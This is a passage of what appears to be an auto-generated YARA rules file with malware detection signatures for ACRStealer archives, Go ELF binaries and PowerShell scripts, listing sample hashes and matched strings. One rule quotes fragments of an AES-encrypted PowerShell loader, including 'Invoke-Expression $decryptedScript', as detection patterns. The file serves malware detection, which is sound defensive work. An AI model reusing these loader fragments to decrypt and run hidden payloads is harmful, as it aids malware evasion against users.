      $s10 = "@http://secure.globalsign.com/cacert/gsgccr45evcodesignca2020.crt0?" fullword ascii /* score: '13.00'*/
      $s11 = "(GlobalSign Timestamping CA - SHA384 - G4" fullword ascii /* score: '11.00'*/
      $s12 = "(GlobalSign Timestamping CA - SHA384 - G40" fullword ascii /* score: '11.00'*/
      $s13 = "7http://secure.globalsign.com/cacert/gstsacasha384g4.crt0" fullword ascii /* score: '9.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x0000 ) and filesize < 4000KB and ( 8 of them )
      ) or ( all of them )
}

rule _ACRStealer_signature__2117f57f_ACRStealer_signature__27f58fcf_ACRStealer_signature__3bd2d790_ACRStealer_signature__9b7749ba_79 {
   meta:
      description = "_subset_batch - from files ACRStealer(signature)_2117f57f.zip, ACRStealer(signature)_27f58fcf.zip, ACRStealer(signature)_3bd2d790.zip, ACRStealer(signature)_9b7749ba.zip, ACRStealer(signature)_d660d279.zip, ACRStealer(signature)_e1bed102.zip, ACRStealer(signature)_f0323945.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "2117f57f93c22c51c923647d42fad9f87ec35db95107c59ab63aa615820b1784"
      hash2 = "27f58fcf40cf8b48d8d8c21285a426c2bcf918acce6989efc7d164ec3286d532"
      hash3 = "3bd2d79089c5ca17b978003c98f765f3d3a87a4a3d1c55bbe02ddc99ec3e9c4c"
      hash4 = "9b7749bac046f5b149fc7c344daed04c35f8b53a4505da93cce2e6a42b9b08b0"
      hash5 = "d660d2798b65e1e90f707b2de97fa88e5edecce0ae99fd272349ed6cdf8815ee"
      hash6 = "e1bed102242bf5308d02fc59209b944f45d633cf2b4f2d6597d0b9ddcc8048ba"
      hash7 = "f03239451ccff4cea92197fdf9726e0ae664290bcdb8b812476ce14eb6384112"
   strings:
      $x1 = "x86/api-ms-win-crt-process-l1-1-0.dll" fullword ascii /* score: '31.00'*/
      $x2 = "x86/api-ms-win-core-processthreads-l1-1-1.dll" fullword ascii /* score: '31.00'*/
      $s3 = "x86/api-ms-win-crt-private-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s4 = "x86/api-ms-win-crt-filesystem-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s5 = "x86/api-ms-win-core-rtlsupport-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s6 = "x86/api-ms-win-core-string-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s7 = "x86/api-ms-win-core-sysinfo-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s8 = "x86/api-ms-win-core-profile-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s9 = "x86/api-ms-win-core-synch-l1-2-0.dll" fullword ascii /* score: '20.00'*/
      $s10 = "x86/api-ms-win-core-timezone-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s11 = "x86/api-ms-win-crt-math-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s12 = "x64/trading_api64.dll" fullword ascii /* score: '20.00'*/
      $s13 = "x86/api-ms-win-crt-conio-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s14 = "x86/api-ms-win-core-synch-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s15 = "x86/api-ms-win-crt-multibyte-l1-1-0.dll" fullword ascii /* score: '20.00'*/
   condition:
      ( uint16(0) == 0x4b50 and filesize < 21000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ece21a96528a6d834_959833eb_98e8eaeda4a91f3f8e75742fbd7fbdaf80e2e4cce9df3f0bb_80 {
   meta:
      description = "_subset_batch - from files 959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ece21a96528a6d834_959833eb.elf, 98e8eaeda4a91f3f8e75742fbd7fbdaf80e2e4cce9df3f0bbea280d52c9714a5_98e8eaed.elf, 9a87d04294becdf4a20c7335e1cc607c20c666cace04d722cb80d138492db042_9a87d042.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ece21a96528a6d834"
      hash2 = "98e8eaeda4a91f3f8e75742fbd7fbdaf80e2e4cce9df3f0bbea280d52c9714a5"
      hash3 = "9a87d04294becdf4a20c7335e1cc607c20c666cace04d722cb80d138492db042"
   strings:
      $s1 = "runtime.fintto64" fullword ascii /* score: '10.00'*/
      $s2 = "runtime.fint32to64" fullword ascii /* score: '10.00'*/
      $s3 = "runtime.fint64to64" fullword ascii /* score: '10.00'*/
      $s4 = "runtime.fadd64" fullword ascii /* score: '10.00'*/
      $s5 = "runtime.feq64" fullword ascii /* score: '10.00'*/
      $s6 = "runtime.fgt64" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.fuint64to64" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.fcmp64" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.fge64" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.funpack64" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.fpack64" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.fpack32" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.fdiv64" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.feq32" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.mullu" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 17000KB and ( 8 of them )
      ) or ( all of them )
}

rule _85b6a96c1941c10c61e6f7da9a189167ec49fddf50f5e17e83af6e6d262e5d46_85b6a96c_a8c873cc72350c6ee8ec2d5ca11086b17245807a60a60ab1c_81 {
   meta:
      description = "_subset_batch - from files 85b6a96c1941c10c61e6f7da9a189167ec49fddf50f5e17e83af6e6d262e5d46_85b6a96c.ps1, a8c873cc72350c6ee8ec2d5ca11086b17245807a60a60ab1cd1ede6735890d60_a8c873cc.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "85b6a96c1941c10c61e6f7da9a189167ec49fddf50f5e17e83af6e6d262e5d46"
      hash2 = "a8c873cc72350c6ee8ec2d5ca11086b17245807a60a60ab1cd1ede6735890d60"
   strings:
      $s1 = "$decryptedScript = Decrypt-AESString -EncryptedString $encryptedPayload -Key $key -IV $iv" fullword ascii /* score: '28.00'*/
      $s2 = "# Encrypted payload and decryption keys" fullword ascii /* score: '22.00'*/
      $s3 = "# Decrypt and execute the payload" fullword ascii /* score: '22.00'*/
      $s4 = "Invoke-Expression $decryptedScript" fullword ascii /* score: '16.00'*/
      $s5 = "        $decryptor = $aes.CreateDecryptor($aes.Key, $aes.IV)" fullword ascii /* score: '12.00'*/
      $s6 = "        $decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)" fullword ascii /* score: '11.00'*/
      $s7 = "# AES Decryption Function" fullword ascii /* score: '10.00'*/
      $s8 = "        if ($decryptor -ne $null) { $decryptor.Dispose() }" fullword ascii /* score: '10.00'*/
      $s9 = "        return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)" fullword ascii /* score: '9.00'*/
      $s10 = "        $encryptedBytes = [Convert]::FromBase64String($EncryptedString)" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x0a0d and filesize < 8000KB and ( all of them )
      ) or ( all of them )
}

